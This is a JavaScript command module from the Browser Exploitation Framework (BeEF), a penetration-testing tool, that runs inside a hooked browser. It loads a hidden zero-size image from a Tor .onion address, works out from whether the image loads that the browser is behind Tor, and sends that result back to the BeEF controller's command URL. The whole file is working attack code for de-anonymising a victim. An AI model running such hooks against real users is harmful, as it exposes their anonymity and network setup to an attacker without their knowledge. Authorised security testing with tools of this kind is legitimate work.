//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	if (document.getElementById('torimg')) {
		return "Img already created";
	}

	var img = new Image();
	img.setAttribute("style","visibility:hidden");
	img.setAttribute("width","0");
	img.setAttribute("height","0");
	//img.src = 'http://dige6xxwpt2knqbv.onion/wink.gif';
	//img.src = 'http://xycpusearchon2mc.onion/deeplogo.jpg'
	img.src = '<%= @tor_resource %>';
	img.id = 'torimg';
	img.setAttribute("attr","start");
	img.onerror = function() {
		this.setAttribute("attr","error");
	};
	img.onload = function() {
		this.setAttribute("attr","load");
	};

	document.body.appendChild(img);

	setTimeout(function() {
		var img = document.getElementById('torimg');	
		if (img.getAttribute("attr") == "error") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Browser is not behind Tor');
		} else if (img.getAttribute("attr") == "load") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Browser is behind Tor');
		} else if (img.getAttribute("attr") == "start") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Browser timed out. Cannot determine if browser is behind Tor');
		};
		document.body.removeChild(img);
		}, <%= @timeout %>);

});
